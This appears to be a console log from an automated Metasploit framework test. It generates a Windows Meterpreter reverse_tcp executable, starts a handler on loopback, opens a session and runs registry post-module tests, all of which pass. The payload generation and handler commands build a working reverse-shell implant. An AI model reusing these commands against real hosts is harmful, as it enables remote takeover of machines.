use windows/meterpreter/reverse_tcp
irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
setg SessionTlvLogging file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-e95wfxtxt
msf6 payload(windows/meterpreter/reverse_tcp) > msf6 payload(windows/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-e95wfxtxt
msf6 payload(windows/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-l0dspu.exe -f exe AutoVerifySessionTimeout=30 lport=6002 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-3b6i4btxt MeterpreterDebugBuild=true
[*] Writing 73802 bytes to D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-l0dspu.exe...
msf6 payload(windows/meterpreter/reverse_tcp) > to_handler AutoVerifySessionTimeout=30 lport=6002 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-3b6i4btxt MeterpreterDebugBuild=true
[*] Payload Handler Started as Job 1
msf6 payload(windows/meterpreter/reverse_tcp) > 
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:6002 
[*] Sending stage (232014 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:49996) at 2024-03-07 09:39:24 +0000
use test/registry
msf6 post(test/registry) > run session=2 AddEntropy=true Verbose=true
[*] Running against session 2
[*] Session type is meterpreter and platform is windows
[+] should create keys
[+] should write REG_BINARY values
[+] should write REG_DWORD values
[+] should write REG_EXPAND_SZ values
[+] should write REG_MULTI_SZ values
[+] should write REG_QWORD values
[+] should write REG_SZ values
[+] should delete keys
[+] should create unicode keys
[+] should write REG_SZ unicode values
[+] should delete unicode keys
[+] should evaluate key existence
[*] PENDING: should evaluate value existence
[+] should read values
[+] should read values with a 32-bit view
[+] should read values with a 64-bit view
[+] should return normalized values
[+] should enumerate keys and values
[*] Testing complete in 7.06 seconds
[*] Passed: 17; Failed: 0; Skipped: 0
[*] Post module execution completed
msf6 post(test/registry) > sessions -K
jobs -K
[*] Killing all sessions...
[*] 127.0.0.1 - Meterpreter session 2 closed.
msf6 post(test/registry) > Stopping all jobs...
